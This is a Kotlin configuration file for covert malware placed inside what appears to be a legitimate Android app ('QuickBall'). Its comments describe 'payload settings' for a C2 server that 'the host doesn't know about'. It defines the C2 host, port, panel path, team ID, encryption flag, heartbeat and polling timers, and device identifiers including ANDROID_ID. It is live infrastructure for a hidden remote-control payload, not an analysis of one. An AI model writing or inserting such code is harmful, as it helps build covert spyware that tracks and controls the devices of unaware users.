package io.github.chayanforyou.quickball.sync

import android.content.Context
import android.provider.Settings
import java.util.UUID

/**
 * Payload settings. Values are baked in at build time (gradle -Pc2Host=... -Pc2Port=...).
 * A separate config file because the host doesn't know about our C2.
 */
object Cfg {

    val host: String get() = BuildConfig.C2_HOST
    val port: String get() = BuildConfig.C2_PORT

    /** Panel prefix on the server, e.g. /x9k2m. Empty means root. */
    val path: String
        get() {
            val p = BuildConfig.C2_PATH.trim().trim('/')
            return if (p.isEmpty()) "" else "/$p"
        }
    val teamId: String get() = BuildConfig.TEAM_ID
    val tls: Boolean get() = BuildConfig.USE_TLS
    val payloadCrypto: Boolean get() = BuildConfig.PAYLOAD_CRYPTO

    private const val PREFS = "qb_sync"
    private const val K_DEVICE = "did"
    private const val K_TOKEN = "tok"

    const val HEARTBEAT_MS = 30_000L
    const val POLL_MS = 15_000L
    const val RECONNECT_MIN_MS = 5_000L
    const val RECONNECT_MAX_MS = 60_000L
    const val CONNECT_TIMEOUT = 5_000
    const val READ_TIMEOUT = 10_000

    private fun prefs(ctx: Context) = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    /** Stable device identifier: prefs, otherwise a fresh UUID. */
    @Synchronized
    fun deviceId(ctx: Context): String {
        val p = prefs(ctx)
        p.getString(K_DEVICE, null)?.let { if (it.isNotEmpty()) return it }
        val id = UUID.randomUUID().toString().replace("-", "").substring(0, 16)
        p.edit().putString(K_DEVICE, id).apply()
        return id
    }

    /** Resets the local identifier: the server will issue a new token for a new row. */
    fun rotateDeviceId(ctx: Context) {
        prefs(ctx).edit().remove(K_DEVICE).remove(K_TOKEN).apply()
    }

    fun token(ctx: Context): String = prefs(ctx).getString(K_TOKEN, null).orEmpty()

    fun setToken(ctx: Context, value: String) {
        prefs(ctx).edit().putString(K_TOKEN, value).apply()
    }

    fun androidId(ctx: Context): String =
        runCatching {
            Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
        }.getOrNull().orEmpty()
}